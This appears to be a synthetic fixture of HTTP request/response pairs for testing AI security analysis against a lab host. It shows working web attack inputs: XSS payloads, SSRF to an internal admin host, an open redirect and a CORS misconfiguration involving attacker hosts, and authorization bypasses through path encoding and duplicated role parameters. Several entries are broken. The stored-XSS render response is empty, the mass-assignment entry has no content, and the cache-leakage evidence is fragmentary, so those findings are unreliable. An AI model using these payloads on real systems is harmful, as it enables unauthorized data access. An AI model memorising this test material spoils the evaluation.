# Bug Bounty AI — Synthetic Security Testing Fixture
# Target: lab.target.local
# Purpose: authorized/local AI security-analysis evaluation only.
# Transactions are separated by ---

# FINDING 1 — BOLA / IDOR
GET /api/v1/users/1002 HTTP/1.1
Host: lab.target.local
X-Authenticated-User: 1001
X-Authenticated-Role: user
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 1002,
  "name": "Maya Patel",
  "email": "maya.patel@example.test",
  "tenant_id": 22,
  "phone": "+91-90000-10002"
}
---

# FINDING 2 — REFLECTED XSS
GET /search?q=%3Cscript%3Edocument.body.dataset.x%3D%271%27%3C%2Fscript%3E HTTP/1.1
Host: lab.target.local
X-Authenticated-User: 1001
X-Authenticated-Role: user
Accept: text/html

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!doctype html>
<html><body>
<h1>Search results</h1>
<div class="query">"<script>document.body.dataset.x='1'</script>"</div>
<p>No results found.</p>
</body></html>
---

# FINDING 3 — OPEN REDIRECT
GET /login?next=https%3A%2F%2Fevil.example.test%2Flanding HTTP/1.1
Host: lab.target.local
X-Authenticated-User: anonymous
X-Authenticated-Role: anonymous
Accept: text/html

HTTP/1.1 302 Found
Location: https://evil.example.test/landing
Cache-Control: no-store
---

# FINDING 4 — SSRF
POST /api/v1/fetch-preview HTTP/1.1
Host: lab.target.local
X-Authenticated-User: 1001
X-Authenticated-Role: user
Content-Type: application/json
Content-Length: 61

{"url":"http://admin.internal.lab/internal/config"}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "fetched_from": "admin.internal.lab",
  "status": 200,
  "content": {
    "service": "admin-console",
    "environment": "staging",
    "debug": true
  }
}
---

# FINDING 5 — CREDENTIAL-ENABLED CORS MISCONFIGURATION
GET /api/v1/profile HTTP/1.1
Host: lab.target.local
Origin: https://attacker.example.test
X-Authenticated-User: 1001
X-Authenticated-Role: user
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://attacker.example.test
Access-Control-Allow-Credentials: true
Vary: Origin

{
  "id": 1001,
  "name": "Arjun Mehta",
  "email": "arjun.mehta@example.test",
  "tenant_id": 17
}
---

# FINDING 6A — STORED XSS: WRITE
POST /api/v1/profile HTTP/1.1
Host: lab.target.local
X-Authenticated-User: 1001
X-Authenticated-Role: user
Content-Type: application/json
Content-Length: 82

{"display_name":"<img src=x onerror=document.body.dataset.pwn='1'>"}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 1001,
  "display_name": "<img src=x onerror=document.body.dataset.pwn='1'>"
}
---

# FINDING 6B — STORED XSS: RENDER
GET /profile/1001 HTTP/1.1

HTTP/1.1 200 OK

</body></html>
---

# FINDING 7A — MASS ASSIGNMENT: BASELINE

# FINDING 8A — AUTHENTICATED CACHE LEAKAGE: USER A
GET /api/v1/account/summary HTTP/1.1
Host: lab.target.local
X-Authenticated-User: 1001
X-Authenticated-Role: user
X-Session: session-a
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: public, max-age=60
Age: 18
ETag: "acct-1001-v4"

{
  "user_id": 1001,
  "email": "arjun.mehta@example.test",
  "tenant_id": 17,
  "plan": "enterprise",
  "balance": 84500
}
---

# FINDING 8B — AUTHENTICATED CACHE LEAKAGE: USER B GETS USER A DATA

Host: lab.target.local

X-Authenticated-Role: user
X-Session: session-b

Content-Type: application/json

{
  "user_id": 1001,
  "email": "arjun.mehta@example.test",

  "plan": "enterprise",

# FINDING 9A — AUTHZ BASELINE: ADMIN ROUTE DENIED
GET /api/admin/users HTTP/1.1
Host: lab.target.local
X-Authenticated-User: 1001
X-Authenticated-Role: user
Accept: application/json

HTTP/1.1 403 Forbidden
Content-Type: application/json

{
  "error": "admin role required"
}
---

# FINDING 9B — PATH NORMALIZATION AUTHORIZATION BYPASS
GET /api/%2e/admin/users HTTP/1.1
Host: lab.target.local
X-Authenticated-User: 1001
X-Authenticated-Role: user
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json

{
  "users": [
    {"id":1001,"username":"arjun","role":"user"},
    {"id":2004,"username":"maya","role":"support"},
    {"id":3007,"username":"ravi","role":"admin"}
  ]
}
---

# FINDING 10A — AUTHZ BASELINE: EXPORT DENIED
POST /api/v1/admin/export HTTP/1.1
Host: lab.target.local
X-Authenticated-User: 1001
X-Authenticated-Role: user
Content-Type: application/json
Content-Length: 2

{}

HTTP/1.1 403 Forbidden
Content-Type: application/json

{
  "error": "administrator privileges required"
}
---

# FINDING 10B — HTTP PARAMETER POLLUTION AUTHZ BYPASS
POST /api/v1/admin/export HTTP/1.1
Host: lab.target.local
X-Authenticated-User: 1001
X-Authenticated-Role: user
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

role=user&role=admin

HTTP/1.1 200 OK
Content-Type: application/json
Content-Disposition: attachment; filename="tenant-export.json"

{
  "exported_for_role": "admin",
  "tenant_id": 17,
  "records": 412
}
---
